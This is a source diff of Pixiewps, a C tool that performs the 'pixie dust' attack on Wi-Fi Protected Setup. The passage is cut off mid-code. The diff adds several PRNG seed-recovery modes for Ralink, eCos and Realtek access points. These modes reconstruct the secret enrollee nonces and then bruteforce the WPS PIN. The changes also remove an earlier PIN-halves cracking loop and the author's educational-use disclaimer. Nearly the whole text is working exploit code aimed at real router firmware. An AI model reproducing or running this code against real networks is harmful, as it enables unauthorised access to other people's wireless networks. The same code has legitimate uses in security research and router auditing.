@@ -2,13 +2,8 @@
  * Pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
  *           All credits for the research go to Dominique Bongard.
  *
- * Special thanks to: datahead, soxrok2212
- *
  * Copyright (c) 2015, wiire <wi7ire@gmail.com>
- * Version: 1.1
- *
- * DISCLAIMER: This tool was made for educational purposes only.
- *             The author is NOT responsible for any misuse or abuse.
+ * SPDX-License-Identifier: GPL-3.0
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -22,19 +17,6 @@
  *
  * You should have received a copy of the GNU General Public License
  * along with this program. If not, see <http://www.gnu.org/licenses/>.
- *
- * In addition, as a special exception, the copyright holders give
- * permission to link the code of portions of this program with the
- * OpenSSL library under certain conditions as described in each
- * individual source file, and distribute linked combinations
- * including the two.
- * You must obey the GNU General Public License in all respects
- * for all of the code used other than OpenSSL.  If you modify
- * file(s) with this exception, you may extend this exception to your
- * version of the file(s), but you are not obligated to do so.  If you
- * do not wish to do so, delete this exception statement from your
- * version.  If you delete this exception statement from all source
- * files in the program, then also delete it here.
  */
 
 #include <stdio.h>
@@ -47,13 +29,19 @@
 
 #include <sys/time.h>
 
-#include "utils.h"
 #include "pixiewps.h"
+#include "wps.h"
 #include "random_r.h"
+#include "config.h"
+#include "utils.h"
+#include "version.h"
 
-int32_t rand_r(uint32_t *seed);
+uint32_t rand_r_simplest(uint32_t *seed);
+uint32_t rand_r(uint32_t *seed);
+uint32_t knuth_rand(uint32_t *seed);
+uint_fast8_t crack(struct global *g, uint_fast32_t *pin);
 
-static const char *option_string = "e:r:s:z:a:n:m:b:Sfv:h?";
+static const char *option_string = "e:r:s:z:a:n:m:b:Sfv:Vh?";
 static const struct option long_options[] = {
 	{ "pke",       required_argument, 0, 'e' },
 	{ "pkr",       required_argument, 0, 'r' },
@@ -66,7 +54,12 @@ static const struct option long_options[] = {
 	{ "dh-small",  no_argument,       0, 'S' },
 	{ "force",     no_argument,       0, 'f' },
 	{ "verbosity", required_argument, 0, 'v' },
-	{ "help",      no_argument,       0, 'h' },
+	{ "version",   no_argument,       0, 'V' },
+	{ "help",      no_argument,       0,  0  },
+	{ "mode",      required_argument, 0,  1  },
+	{ "start",     required_argument, 0,  2  },
+	{ "end",       required_argument, 0,  3  },
+	{  0,          no_argument,       0, 'h' },
 	{  0,          0,                 0,  0  }
 };
 
@@ -74,37 +67,42 @@ int main(int argc, char **argv) {
 
 	struct global *wps;
 	if ((wps = calloc(1, sizeof(struct global)))) {
+		wps->mode_auto = 1;
 		wps->verbosity = 3;
 		wps->error = calloc(256, 1);
 		if (!wps->error)
 			goto memory_err;
 		wps->error[0] = '\n';
 	} else {
-		memory_err:
-			fprintf(stderr, "\n [X] Memory allocation error!\n");
-			return MEM_ERROR;
+memory_err:
+		fprintf(stderr, "\n [X] Memory allocation error!\n");
+		return MEM_ERROR;
 	}
+
+	time_t start_p = 0, end_p = 0;
+	clock_t c_start = 0, c_end;
 
 	int opt = 0;
 	int long_index = 0;
+	uint_fast8_t c = 0;
 	opt = getopt_long(argc, argv, option_string, long_options, &long_index);
-
 	while (opt != -1) {
+		c++;
 		switch (opt) {
 			case 'e':
-				wps->pke = malloc(WPS_PUBKEY_LEN);
+				wps->pke = malloc(WPS_PKEY_LEN);
 				if (!wps->pke)
 					goto memory_err;
-				if (hex_string_to_byte_array(optarg, wps->pke, WPS_PUBKEY_LEN)) {
+				if (hex_string_to_byte_array(optarg, wps->pke, WPS_PKEY_LEN)) {
 					snprintf(wps->error, 256, "\n [!] Bad enrollee public key -- %s\n\n", optarg);
 					goto usage_err;
 				}
 				break;
 			case 'r':
-				wps->pkr = malloc(WPS_PUBKEY_LEN);
+				wps->pkr = malloc(WPS_PKEY_LEN);
 				if (!wps->pkr)
 					goto memory_err;
-				if (hex_string_to_byte_array(optarg, wps->pkr, WPS_PUBKEY_LEN)) {
+				if (hex_string_to_byte_array(optarg, wps->pkr, WPS_PKEY_LEN)) {
 					snprintf(wps->error, 256, "\n [!] Bad registrar public key -- %s\n\n", optarg);
 					goto usage_err;
 				}
@@ -164,20 +162,77 @@ int main(int argc, char **argv) {
 				}
 				break;
 			case 'S':
-				wps->small_dh_keys = true;
+				wps->small_dh_keys = 1;
 				break;
 			case 'f':
-				wps->bruteforce = true;
+				wps->bruteforce = 1;
 				break;
 			case 'v':
-				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || 3 < wps->verbosity) {
+				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || wps->verbosity > 3) {
 					snprintf(wps->error, 256, "\n [!] Bad verbosity level -- %s\n\n", optarg);
 					goto usage_err;
 				};
 				break;
+			case 'V':
+			{
+				struct timeval t_current;
+				gettimeofday(&t_current, 0);
+				time_t r_time;
+				struct tm ts;
+				char buffer[30];
+				r_time = t_current.tv_sec;
+				ts = *localtime(&r_time);
+				strftime(buffer, 30, "%c", &ts);
+				fprintf(stderr, "\n Pixiewps %s\n\n [*] System time: %s\n\n", LONG_VERSION, buffer);
+				free(wps->error);
+				free(wps);
+				return ARG_ERROR;
+			}
 			case 'h':
 				goto usage_err;
 				break;
+			case  0 :
+				if (strcmp("help", long_options[long_index].name) == 0) {
+					fprintf(stderr, v_usage, SHORT_VERSION,
+						p_mode_name[RT],
+						p_mode_name[ECOS_SIMPLE],
+						p_mode_name[RTL819x],
+						p_mode_name[ECOS_SIMPLEST],
+						p_mode_name[ECOS_KNUTH]
+					);
+					free(wps->error);
+					free(wps);
+					return ARG_ERROR;
+				}
+				goto usage_err;
+			case  1 :
+				if (strcmp("mode", long_options[long_index].name) == 0) {
+					if (parse_mode(optarg, p_mode, MODE_LEN)) {
+						snprintf(wps->error, 256, "\n [!] Bad modes -- %s\n\n", optarg);
+						goto usage_err;
+					}
+					wps->mode_auto = 0;
+					break;
+				}
+				goto usage_err;
+			case  2 :
+				if (strcmp("start", long_options[long_index].name) == 0) {
+					if (get_unix_datetime(optarg, &(start_p))) {
+						snprintf(wps->error, 256, "\n [!] Bad starting point -- %s\n\n", optarg);
+						goto usage_err;
+					}
+					break;
+				}
+				goto usage_err;
+			case  3 :
+				if (strcmp("end", long_options[long_index].name) == 0) {
+					if (get_unix_datetime(optarg, &(end_p))) {
+						snprintf(wps->error, 256, "\n [!] Bad ending point -- %s\n\n", optarg);
+						goto usage_err;
+					}
+					break;
+				}
+				goto usage_err;
 			case '?':
 			default:
 				fprintf(stderr, "Run %s -h for help.\n", argv[0]);
@@ -189,13 +244,16 @@ int main(int argc, char **argv) {
 	}
 
 	if (argc - optind != 0) {
-		snprintf(wps->error, 256, "\n [!] Unknown argument(s)!\n\n");
-
-		usage_err:
-			fprintf(stderr, usage, VERSION, argv[0], wps->error);
+		snprintf(wps->error, 256, "\n [!] Unknown extra argument(s)!\n\n");
+		goto usage_err;
+	} else {
+		if (!c) {
+usage_err:
+			fprintf(stderr, usage, SHORT_VERSION, argv[0], wps->error);
 			free(wps->error);
 			free(wps);
 			return ARG_ERROR;
+		}
 	}
 
 	/* Not all required arguments have been supplied */
@@ -216,14 +274,100 @@ int main(int argc, char **argv) {
 		goto usage_err;
 	}
 
+	/* Cannot specify --start or --end if --force is selected */
+	if (wps->bruteforce && (start_p || end_p)) {
+		if (start_p || end_p) {
+			snprintf(wps->error, 256, "\n [!] Cannot specify --start or --end if --force is selected!\n\n");
+			goto usage_err;
+		}
+	}
+
+	if (wps->mode_auto) { /* Mode auto */
+		if (wps->pke && !memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
+			p_mode[0] = RTL819x;
+			p_mode[1] = NONE;
+			if (!wps->e_nonce) {
+				snprintf(wps->error, 256, "\n [!] Enrollee nonce is needed for mode %u!\n\n", RTL819x);
+				goto usage_err;
+			}
+		} else {
+			p_mode[0] = RT;
+			p_mode[1] = ECOS_SIMPLE;
+
+			/* Not tested */
+#ifdef EXTRA
+			p_mode[2] = ECOS_SIMPLEST;
+			p_mode[3] = ECOS_KNUTH;
+			p_mode[4] = NONE;
+#else
+			p_mode[2] = NONE;
+#endif
+		}
+	}
+
+	DEBUG_PRINT("Debugging enabled");
+	DEBUG_PRINT("Modes: %d (%s), %d (%s), %d (%s), %d (%s), %d (%s)",
+		p_mode[0], p_mode_name[p_mode[0]],
+		p_mode[1], p_mode_name[p_mode[1]],
+		p_mode[2], p_mode_name[p_mode[2]],
+		p_mode[3], p_mode_name[p_mode[3]],
+		p_mode[4], p_mode_name[p_mode[4]]
+	);
+
+	if (is_mode_selected(RTL819x)) { /* Ignore --start and --end otherwise */
+
+		struct timeval t_now;
+		gettimeofday(&t_now, 0);
+		wps->start = t_now.tv_sec;
+		wps->end = t_now.tv_sec - MODE3_DAYS * SEC_PER_DAY;
+
+		/* Attributes --start and --end can be switched start > end or end > start */
+		if (start_p) {
+			if (end_p) {
+
+				/* Attributes --start and --end must be different */
+				if (start_p == end_p) {
+					snprintf(wps->error, 256, "\n [!] Starting and Ending points must be different!\n\n");
+					goto usage_err;
+				}
+				if (end_p > start_p) {
+					wps->start = end_p;
+					wps->end = start_p;
+				} else {
+					wps->start = start_p;
+					wps->end = end_p;
+				}
+			} else {
+				if (start_p >= wps->start) {
+					snprintf(wps->error, 256, "\n [!] Bad Starting point!\n\n");
+					goto usage_err;
+				} else {
+					wps->end = start_p;
+				}
+			}
+		} else {
+			if (end_p) {
+				if (end_p >= wps->start) {
+					snprintf(wps->error, 256, "\n [!] Bad Ending point!\n\n");
+					goto usage_err;
+				} else {
+					wps->end = end_p;
+				}
+			} else {
+				if (wps->bruteforce)
+					wps->end = 0;
+			}
+		}
+	}
+
 	if (wps->small_dh_keys) { /* Small DH keys selected */
-		wps->pkr = malloc(WPS_PUBKEY_LEN);
+		wps->pkr = malloc(WPS_PKEY_LEN);
 		if (!wps->pkr)
 			goto memory_err;
 
 		/* g^A mod p = 2 (g = 2, A = 1, p > 2) */
-		memset(wps->pkr, 0, WPS_PUBKEY_LEN - 1);
-		wps->pkr[WPS_PUBKEY_LEN - 1] = 0x02;
+		memset(wps->pkr, 0, WPS_PKEY_LEN - 1);
+		wps->pkr[WPS_PKEY_LEN - 1] = 0x02;
 
 		if (!wps->authkey) {
 			if (wps->e_nonce) {
@@ -236,12 +380,14 @@ int main(int argc, char **argv) {
 						if (!wps->kdk)
 							goto memory_err;
 
-						unsigned char *buffer = malloc(WPS_NONCE_LEN * 2 + WPS_BSSID_LEN);
+						uint8_t *buffer = malloc(WPS_NONCE_LEN * 2 + WPS_BSSID_LEN);
 						if (!buffer)
 							goto memory_err;
 
+						c_start = clock();
+
 						/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKe) (g = 2, A = 1, p > 2) */
-						sha256(wps->pke, WPS_PUBKEY_LEN, wps->dhkey);
+						sha256(wps->pke, WPS_PKEY_LEN, wps->dhkey);
 
 						memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
 						memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
@@ -255,7 +401,7 @@ int main(int argc, char **argv) {
 							goto memory_err;
 
 						/* Key derivation function */
-						kdf(wps->kdk, WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN + WPS_EMSK_LEN, buffer);
+						kdf(wps->kdk, buffer);
 
 						wps->authkey = malloc(WPS_AUTHKEY_LEN);
 						if (!wps->authkey)
@@ -302,250 +448,363 @@ int main(int argc, char **argv) {
 	wps->psk1 = malloc(WPS_HASH_LEN); if (!wps->psk1) goto memory_err;
 	wps->psk2 = malloc(WPS_HASH_LEN); if (!wps->psk2) goto memory_err;
 
-	unsigned char *result = (unsigned char *) malloc(WPS_HASH_LEN);
-	if (!result)
-		goto memory_err;
-	unsigned char *buffer = (unsigned char *) malloc(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2);
-	if (!buffer)
-		goto memory_err;
-
+	uint_fast8_t k = 0;
+	uint_fast8_t found_p_mode = NONE;
+	uint_fast32_t pin;
 	uint32_t seed;
-	uint32_t print_seed; /* Seed to display at the end */
-	unsigned int first_half = 0;
-	unsigned int second_half = 0;
-	unsigned char s_pin[4] = {0};
-	bool valid = false;
+	uint32_t print_seed = 0;
 
-	uint_fast8_t mode = 1; bool found = false;
-	clock_t c_start, c_end;
-	c_start = clock();
+	if (!c_start)
+		c_start = clock();
 
-	while (mode <= MAX_MODE && !found) {
+	/* Main loop */
+	while (!found_p_mode && p_mode[k] != NONE && k < MODE_LEN) {
 
-		seed = 0; print_seed = 0;
+		/* 1 */
+		if (p_mode[k] == RT) {
 
-		/* E-S1 = E-S2 = E-Nonce */
-		if (mode == 2 && wps->e_nonce) {
-			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
-			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);
-		}
+			DEBUG_PRINT(" * Mode: %d (%s)", RT, p_mode_name[RT]);
+			DEBUG_PRINT("Trying with E-S1: ");
+			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+			DEBUG_PRINT("Trying with E-S2: ");
+			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-		/* PRNG bruteforce (rand_r) */
-		if (mode == 3 && wps->e_nonce) {
+			uint_fast8_t r = crack(wps, &pin);
+			if (r == PIN_FOUND) {
+				found_p_mode = RT;
+				DEBUG_PRINT("Pin found");
+			} else if (r == MEM_ERROR) {
+				goto memory_err;
+			}
 
-			/* Reducing entropy from 32 to 25 bits */
-			uint32_t index = wps->e_nonce[0] << 25;
-			uint32_t limit = index | 0x01ffffff;
+		/* 2 */
+		} else if (p_mode[k] == ECOS_SIMPLE && wps->e_nonce) {
 
-			while (1) {
+			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLE, p_mode_name[ECOS_SIMPLE]);
+
+			uint32_t index = wps->e_nonce[0] << 25; /* Reducing entropy from 32 to 25 bits */
+			do {
 				seed = index;
-
 				uint_fast8_t i;
 				for (i = 1; i < WPS_NONCE_LEN; i++) {
-					if (wps->e_nonce[i] != (unsigned char) rand_r(&seed)) break;
+					if (wps->e_nonce[i] != (uint8_t) (rand_r(&seed) & 0xff))
+						break;
 				}
-
 				if (i == WPS_NONCE_LEN) { /* Seed found */
 					print_seed = seed;
 
-					/* Advance to get E-S1 */
-					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
-						wps->e_s1[i] = (unsigned char) rand_r(&seed);
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
+						wps->e_s1[i] = (uint8_t) (rand_r(&seed) & 0xff);
 
-					/* Advance to get E-S2 */
-					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++)
-						wps->e_s2[i] = (unsigned char) rand_r(&seed);
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
+						wps->e_s2[i] = (uint8_t) (rand_r(&seed) & 0xff);
 
+					DEBUG_PRINT("Seed found");
 					break;
 				}
-
-				if (index == limit) break; /* Complete bruteforce exausted */
-
 				index++;
+			} while (!(index & 0x02000000));
+
+			if (print_seed) { /* Seed found */
+
+				DEBUG_PRINT("Trying with E-S1: ");
+				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+				DEBUG_PRINT("Trying with E-S2: ");
+				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+				uint_fast8_t r = crack(wps, &pin);
+				if (r == PIN_FOUND) {
+					found_p_mode = ECOS_SIMPLE;
+					DEBUG_PRINT("Pin found");
+				} else if (r == MEM_ERROR) {
+					goto memory_err;
+				}
 			}
-		}
 
-		/* PRNG bruteforce (random_r) */
-		if (mode == 4 && wps->e_nonce) {
+		/* 3 */
+		} else if (p_mode[k] == RTL819x && wps->e_nonce) {
 
-			/* Checks if the sequence may actually be generated by current random function */
-			if (wps->e_nonce[0] < 0x80 && wps->e_nonce[4] < 0x80 && wps->e_nonce[8] < 0x80  && wps->e_nonce[12] < 0x80) {
+			DEBUG_PRINT(" * Mode: %d (%s)", RTL819x, p_mode_name[RTL819x]);
 
-				valid = true;
+			/* E-S1 = E-S2 = E-Nonce - Best case scenario */
+			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
+			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);
 
-				/* Converting enrollee nonce to the sequence may be generated by current random function */
-				uint32_t randr_enonce[4] = {0};
-				uint_fast8_t j = 0;
-				for (uint_fast8_t i = 0; i < 4; i++) {
-					randr_enonce[i] |= wps->e_nonce[j++];
-					randr_enonce[i] <<= 8;
-					randr_enonce[i] |= wps->e_nonce[j++];
-					randr_enonce[i] <<= 8;
-					randr_enonce[i] |= wps->e_nonce[j++];
-					randr_enonce[i] <<= 8;
-					randr_enonce[i] |= wps->e_nonce[j++];
-				}
+			DEBUG_PRINT("Trying with E-S1: ");
+			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+			DEBUG_PRINT("Trying with E-S2: ");
+			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
 
-				uint32_t limit;
-				struct timeval curr_time;
-				gettimeofday(&curr_time, 0);
+			uint_fast8_t r = crack(wps, &pin);
+			if (r == PIN_FOUND) {
+				found_p_mode = RTL819x;
+				DEBUG_PRINT("Pin found");
+			} else if (r == MEM_ERROR) {
+				goto memory_err;
+			}
 
-				if (wps->bruteforce) {
-					seed = curr_time.tv_sec + SEC_PER_DAY * MODE4_DAYS - SEC_PER_HOUR * 2;
-					limit = 0;
+			if (found_p_mode == NONE) {
+				if (wps->small_dh_keys || check_small_dh_keys(wps->pkr)) {
+					if (!wps->warning) {
+						wps->warning = calloc(256, 1);
+						if (!wps->warning)
+							goto memory_err;
+						snprintf(wps->warning, 256, " [!] Small DH keys is not supported for mode %u!\n\n", RTL819x);
+					}
 				} else {
-					seed = curr_time.tv_sec + SEC_PER_HOUR * 2;
-					limit = curr_time.tv_sec - SEC_PER_DAY * MODE4_DAYS - SEC_PER_HOUR * 2;
-				}
 
-				struct random_data *buf = (struct random_data *) calloc(1, sizeof(struct random_data));
-				char *rand_statebuf = (char *) calloc(1, 128);
+					/* Checks if the sequence may actually be generated by current random function */
+					if (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
+						!(wps->e_nonce[8] & 0x80) && !(wps->e_nonce[12] & 0x80)) {
 
-				initstate_r(seed, rand_statebuf, 128, buf);
-				int32_t res = 0;
-
-				while (1) {
-					srandom_r(seed, buf);
-
-					uint_fast8_t i;
-					for (i = 0; i < 4; i++) {
-						random_r(buf, &res);
-						if ((uint32_t) res != randr_enonce[i]) break;
-					}
-
-					if (i == 4) {
-						print_seed = seed;
-						srandom_r(print_seed + 1, buf);
-						for (uint_fast8_t j = 0; j < 4; j++) {
-							random_r(buf, &res);
-							uint32_t be = h32_to_be(res);
-							memcpy(&(wps->e_s1[4 * j]), &be, 4);
-							memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN); /* E-S1 = E-S2 != E-Nonce */
+						/* Converting enrollee nonce to the sequence may be generated by current random function */
+						uint32_t randr_enonce[4] = { 0 };
+						uint_fast8_t j = 0;
+						for (uint_fast8_t i = 0; i < 4; i++) {
+							randr_enonce[i] |= wps->e_nonce[j++];
+							randr_enonce[i] <<= 8;
+							randr_enonce[i] |= wps->e_nonce[j++];
+							randr_enonce[i] <<= 8;
+							randr_enonce[i] |= wps->e_nonce[j++];
+							randr_enonce[i] <<= 8;
+							randr_enonce[i] |= wps->e_nonce[j++];
 						}
-					}
 
-					if (print_seed || seed == limit) {
+						#if DEBUG
+						{
+							struct tm ts;
+							char buffer[30];
+							ts = *localtime(&wps->start);
+							strftime(buffer, 30, "%c", &ts);
+							printf("\n [DEBUG] %s:%d:%s(): Start: %10ld (%s)",
+								__FILE__, __LINE__, __func__, (long) wps->start, buffer);
+							ts = *localtime(&wps->end);
+							strftime(buffer, 30, "%c", &ts);
+							printf("\n [DEBUG] %s:%d:%s(): End:   %10ld (%s)",
+								__FILE__, __LINE__, __func__, (long) wps->end, buffer);
+							fflush(stdout);
+						}
+						#endif
+
+						struct random_data *buf = calloc(1, sizeof(struct random_data));
+						char *rand_statebuf = calloc(1, 128);
+
+						seed = wps->start;
+						uint32_t limit = wps->end;
+						initstate_r(seed, rand_statebuf, 128, buf);
+						int32_t res = 0;
+
+						while (1) {
+							srandom_r(seed, buf);
+							uint_fast8_t i;
+							for (i = 0; i < 4; i++) {
+								random_r(buf, &res);
+								if ((uint32_t) res != randr_enonce[i])
+									break;
+							}
+
+							if (i == 4) {
+								print_seed = seed;
+								DEBUG_PRINT("Seed found");
+							}
+
+							if (print_seed || seed == limit) {
+								break;
+							}
+
+							seed--;
+						}
+
+						if (print_seed) { /* Seed found */
+							uint_fast8_t i = 0;
+							uint8_t tmp_s_nonce[16];
+							do {
+								i++;
+								srandom_r(print_seed + i, buf);
+								for (uint_fast8_t j = 0; j < 4; j++) {
+									random_r(buf, &res);
+									uint32_t be = h32_to_be(res);
+									memcpy(&(wps->e_s1[4 * j]), &be, 4);
+									memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN);        /* E-S1 = E-S2 != E-Nonce */
+								}
+
+								DEBUG_PRINT("Trying with E-S1: ");
+								DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+								DEBUG_PRINT("Trying with E-S2: ");
+								DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+								uint_fast8_t r = crack(wps, &pin);
+								if (r == PIN_FOUND) {
+									found_p_mode = RTL819x;
+									DEBUG_PRINT("Pin found");
+								} else if (r == PIN_ERROR) {
+									if (i == 1) {
+										memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
+										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
+									} else {
+										memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
+										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
+									}
+
+									DEBUG_PRINT("Trying with E-S1: ");
+									DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+									DEBUG_PRINT("Trying with E-S2: ");
+									DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+									uint_fast8_t r2 = crack(wps, &pin);
+									if (r2 == PIN_FOUND) {
+										found_p_mode = RTL819x;
+										DEBUG_PRINT("Pin found");
+									} else if (r2 == MEM_ERROR) {
+										goto memory_err;
+									}
+								} else if (r == MEM_ERROR) {
+									goto memory_err;
+								}
+							} while (found_p_mode == NONE && i <= MODE3_TRIES);
+						}
+
+						if (found_p_mode == NONE && !wps->bruteforce) {
+							if (!wps->warning) {
+								wps->warning = calloc(256, 1);
+								if (!wps->warning)
+									goto memory_err;
+								snprintf(wps->warning, 256, " [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.\n\n");
+							}
+						}
+
 						free(buf);
 						free(rand_statebuf);
-						break;
 					}
-
-					seed--;
 				}
 			}
-		}
 
-		/* WPS pin cracking */
-		if (mode == 1 || (mode == 2 && wps->e_nonce) || (mode == 3 && print_seed) || (mode == 4 && print_seed)) {
+		/* 4 */
+		} else if (p_mode[k] == ECOS_SIMPLEST && wps->e_nonce) {
 
-		crack:
-			first_half = 0; second_half = 0;
+			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLEST, p_mode_name[ECOS_SIMPLEST]);
 
-			while (first_half < 10000) {
-				uint_to_char_array(first_half, 4, s_pin);
-				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk1);
-				memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
-				memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
-				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
-				memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
-				hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);
+			uint32_t index = 0;
+			do {
+				seed = index;
+				uint_fast8_t i;
+				for (i = 0; i < WPS_NONCE_LEN; i++) {
+					if (wps->e_nonce[i] != (uint8_t) rand_r_simplest(&seed))
+						break;
+				}
+				if (i == WPS_NONCE_LEN) { /* Seed found */
+					print_seed = seed;
 
-				if (memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
-					first_half++;
-				} else {
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
+						wps->e_s1[i] = (uint8_t) rand_r_simplest(&seed);
+
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
+						wps->e_s2[i] = (uint8_t) rand_r_simplest(&seed);
+
+					DEBUG_PRINT("Seed found");
 					break;
 				}
+				index++;
+			} while (index != 0xffffffff);
+
+			if (print_seed) { /* Seed found */
+
+				DEBUG_PRINT("Trying with E-S1: ");
+				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+				DEBUG_PRINT("Trying with E-S2: ");
+				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
+				uint_fast8_t r = crack(wps, &pin);
+				if (r == PIN_FOUND) {
+					found_p_mode = ECOS_SIMPLEST;
+					DEBUG_PRINT("Pin found");
+				} else if (r == MEM_ERROR) {
+					goto memory_err;
+				}
 			}
 
-			if (first_half < 10000) { /* First half found */
-				uint_fast8_t checksum_digit;
-				unsigned int c_second_half;
+		/* 5 */
+		} else if (p_mode[k] == ECOS_KNUTH && wps->e_nonce) {
 
-				/* Testing with checksum digit */
-				while (second_half < 1000) {
-					checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
-					c_second_half = second_half * 10 + checksum_digit;
-					uint_to_char_array(c_second_half, 4, s_pin);
-					hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk2);
-					memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
-					memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
-					memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
-					memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
-					hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);
+			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_KNUTH, p_mode_name[ECOS_KNUTH]);
 
-					if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
-						second_half++;
-					} else {
-						second_half = c_second_half;
-						found = true;
+			uint32_t index = 0;
+			do {
+				seed = index;
+				uint_fast8_t i;
+				for (i = 0; i < WPS_NONCE_LEN; i++) {
+					if (wps->e_nonce[i] != (uint8_t) knuth_rand(&seed))
 						break;
-					}
 				}
+				if (i == WPS_NONCE_LEN) { /* Seed found */
+					print_seed = seed;
 
-				/* Testing without checksum digit */
-				if (!found) {
-					second_half = 0;
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
+						wps->e_s1[i] = (uint8_t) knuth_rand(&seed);
 
-					while (second_half < 10000) {
+					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
+						wps->e_s2[i] = (uint8_t) knuth_rand(&seed);
 
-						/* If already tested skip */
-						if (wps_pin_valid(first_half * 10000 + second_half)) {
-							second_half++;
-							continue;
-						}
+					DEBUG_PRINT("Seed found");
+					break;
+				}
+				index++;
+			} while (index != 0xffffffff);
 
-						uint_to_char_array(second_half, 4, s_pin);
-						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, (unsigned char *) s_pin, 4, wps->psk2);
-						memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
-						memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
-						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PUBKEY_LEN);
-						memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN, wps->pkr, WPS_PUBKEY_LEN);
-						hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer, WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PUBKEY_LEN * 2, result);
+			if (print_seed) { /* Seed found */
 
-						if (memcmp(result, wps->e_hash2, WPS_HASH_LEN)) {
-							second_half++;
-						} else {
-							found = true;
-							break;
-						}
-					}
+				DEBUG_PRINT("Trying with E-S1: ");
+				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
+				DEBUG_PRINT("Trying with E-S2: ");
+				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);
+
